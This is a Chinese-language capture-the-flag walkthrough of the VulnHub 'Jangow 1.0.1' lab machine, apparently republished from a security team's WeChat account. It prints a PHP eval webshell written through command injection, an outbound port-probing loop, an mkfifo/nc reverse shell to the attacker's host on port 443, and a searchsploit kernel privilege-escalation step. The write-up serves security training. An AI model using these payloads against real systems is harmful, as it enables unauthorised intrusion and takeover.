> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/T89-46mywd6FKUTroUoEfA)

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3zjYyBh36DicJTwtoQrsK4ibApZLJpkP4fe8U4aGJbw96ibsAawUKxAa82icFibyNEcdKXHRakmrLEnA/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3zjYyBh36DicJTwtoQrsK4ibApZLJpkP4fe8U4aGJbw96ibsAawUKxAa82icFibyNEcdKXHRakmrLEnA/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1)

**靶机介绍**

Name: Jangow: 1.0.1  
Difficulty:easy  
Flag : 2 Flag first user And second root  
靶机下载地址：

https://www.vulnhub.com/entry/jangow-101,754/

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3zjYyBh36DicJTwtoQrsK4ibApZLJpkP4fe8U4aGJbw96ibsAawUKxAa82icFibyNEcdKXHRakmrLEnA/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1)

实验环境

攻击机：本机(192.168.11.1)、kali(192.168.11.143)  
靶机：Linux，IP自动获取  
攻击机与靶机都使用net网络连接，在同一网段下

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3zjYyBh36DicJTwtoQrsK4ibApZLJpkP4fe8U4aGJbw96ibsAawUKxAa82icFibyNEcdKXHRakmrLEnA/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1)

渗透测试步骤

  

1、使用nmap扫描网段，获得靶机IP

```
nmap -sn 192.168.11.0/24
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwS7pF2iaw0ElsVibxBqMeoIwsR7cHUsfjs5P3iaOrS8sVF5nUfg1jZeFUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

2、使用masscan快速探测目标开放的端口

```
masscan -p 0-65535 192.168.11.160 --rate=10000
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwqrrJXMDalaNvLRvQgBRnmxNnSeV7tgtGSzt2atzBVQ7jyJKGI5kIRA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

3、使用nmap对开放的端口进行服务探测

```
nmap -sC -p 21,80 192.168.11.160
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwZfTyiabQReYoXvxiazJ2fRUtH9af31VUGxbxh3Csia4y1waKic9ibP58rNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

发现开放了ftp服务和http服务  
4、访问目标的80端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwUPgFzuOtfzhC2FdyE3YibgicBSUYEIf3IAzDuRz38DyUJMUXviaB5ozXw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

访问site目录

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0Yyfwib6XcaDZibq4jN5euA0IL2yibGKZc1gCJH569RUGicvgcFthaWh6iboVFGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

点击各个功能点，最后发现如下位置存在命令执行漏洞  
http://192.168.11.160/site/busque.php?buscar=

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwkOeFu5mCIz0bnsXgQ7OGickDOlUOycPhggyXTjM4LFVtPHmvrDbgLCQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

5、通过漏洞写入webshell  
写入PHP一句话木马

```
`echo '<?php eval($_POST["cmd"]);?>' > cmd.php``注意：echo后面的整条语句一定要用单引号包起来`
```

成功写入：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0Yyfw8RWLqPAhcjPK0U7AsJ2LfmRicI6MOgeYFJLIKm1iajq2gPG9qxGicWkpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

用蚁剑成功连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwCTBLvoNlloFm14mEhvFjMiaFs2CueqvJnbs8QtBcTL2X3CkoB9D8fsg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

6、在kali开启nc监听4444端口，利用bash反弹shell，但是发现全部报错了

```
nc -lvp 4444
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0Yyfw6YnMk7QUoN5rXrP7tmeaefrqDNfxhHRQiae99ickoMldQa0Giar3gdyTA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwqGWqzNJKwGfKBEFLQQX9iciazyR5UWFjLk9cwicQe8iczyTLbThmaUX9DA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

经过命令查询发现目标机安装了nc、python3、php  
都没能反弹成功。由此考虑到可能是存在端口限制！！！  
7、通过nc探测可用端口(一般服务器不会对80、443端口做限制)  
1）在kali上把1-65535所有端口绑定到某个端口上

```
sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
```

监听这个端口

```
nc -lvp 1234
```

2）在靶机上运行如下脚本进行探测

```
`# !/bin/bash``for i in {1..65535};``do` `timeout 1 nc -vz 192.168.11.143 $i && echo "$i open" >> out.txt || echo "$i closed" >> out.txt;``done`
```

发现443端口没有被限制

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwHLLibfU5C4FYiaJo40FIZnKbiaHgVwPuicTsIWKibIsJadricUiaib1nyJm1Yw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

于是在kali监听443端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwRQ61ESl5xOVBCbnXEHvqjrBsxS2149IKFwYGvPekF9ba1bRSIvMfeg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在蚁剑中输入反弹shell的命令，依旧失败？？？试了用冰蝎连webshell之后执行反弹命令也失败。  
解决办法是通过访问式反弹shell，在目标机创建如下php文件

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.11.143 443 >/tmp/f");?>
```

然后访问该php文件，才反弹成功！！！

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwK2jsdfgDYkF3knXqP5CW32IH71fedBYRxLBoW2LMeFxMBp55p29Ogg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwzMYHxjJ2COwzUQ49pJwCQ13XcMCqJFFvjuK5ZohIPpmA6JPQGha1vg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

8、寻找敏感文件  
找到desafio02/desafio02、jangow01/abygurl69账号和密码  
并在jangow01加目录下得到flag1

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwDZnx3gTNPC1oJDt4gNXnXboj6D8ujZefVxv1y3yYvnhWhem8kgCLng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

测试发现jangow01/abygurl69是ftp、以及jangow01登录的账号和密码  
9、提权

```
uname -a
```

查看系统版本

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0Yyfwt0grPHcia1Ztdzoqgg5P51zwUU4nibDHS0Ox3BsAyzYN6IrgWKiax0ZIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

利用kali中的searchsploit查找可用于提权的脚本

```
searchsploit ubuntu 4.4.0-31
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0Yyfw3Gwk2mSTfO392YUu08zf1lfENNjcf0nnmtnSjbm9R9zyCYNajhRfaQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

下载其中的脚本进行编译

```
searchsploit -m linux/local/45010.c
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwgWTibeuiaEgHC0tEtYUf5tice8jJS2V69tc1icGIjxiaFr1GCic2o06BVouw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwFgtof8weib3SIIrhHcDU299kJ90FZqNGEYYR04YiaqeXlOsj42LWNd0A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

10、上传到目标主机进行提权  
但是发现不能通过蚁剑上传，本来是可以通过在kali的443端口上开启http服务，然后让目标主机访问下载，但是443端口已经用来做反弹shell的端口了，其他端口都被做了限制，于是想到利用ftp上传，反正已经获得了ftp的账号密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwUJwic1icRjiaQw5icR3ica1faXMN9t5S4kPLBKYBSHKuVH7nos9eTOcibFLA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

添加执行权限，但是发现 www-data 没有这个权力，于是切换用户到 jangow01

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwsQHgUwEPsHSxXtibtky6YrclUKLicicfHKFdXmdXRry7XUiajErE2zavUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功提权

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwPvKZepvP6QicVYlBRdFAaIfMKLwErIzMK61SJYdgibgHWmbDSUic1juRw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在/root目录下获得flag2

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwPUB3wAUsM45PWp0MdpHeowaibpV08kVsDqbX8pibGugGTLH0mFWjZ3yQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRLqgKGNJyxz3zjYyBh36DicJTwtoQrsK4ibApZLJpkP4fe8U4aGJbw96ibsAawUKxAa82icFibyNEcdKXHRakmrLEnA/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1)

总结

  

这个靶场主要是通过一个命令执行漏洞写入一句话，然后使用蚁剑连接得到webshell，但是在反弹shell得时候碰到了问题，尝试使用bash、php、nc等进行反弹都没有成功，发现原来是服务器能够访问的外部端口受到了限制，最后通过探测发现只能访问外部的443端口，于是在kali使用nc监听443端口，然后通过访问式触发nc反弹命令才成功。  
    得到反弹的shell之后通过寻找敏感文件得到了普通用户的账户密码，可用于用户切换以及ftp登录，最后就是通过查看内核版本，寻找对应可提权的脚本，通过ftp上传，最后运行提权脚本得到root权限。

  

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwWZjN66TuM8rRcK1N7vpsUHPXVvvYQqfibCU1ORKWJWfACXBYsG5qwCQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwNrfvGicYLH3UefTgsptzXC8wHLuwJmASlfflrJDccnD9CeKnqMCzQLA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwuvnMhht5PEVaApMPEA3Kiaxq4Gnvq8dparX4iaAFDgyHsuyYrXT8aIrA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVOtj05yVIeU5rZcjk0YyfwAiaNGnfb3oy1BTzK2eQaISYN0kI0LibxVWlYSibfOgjdggBicBwRt7ribYA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**长按识别二维码关注我们**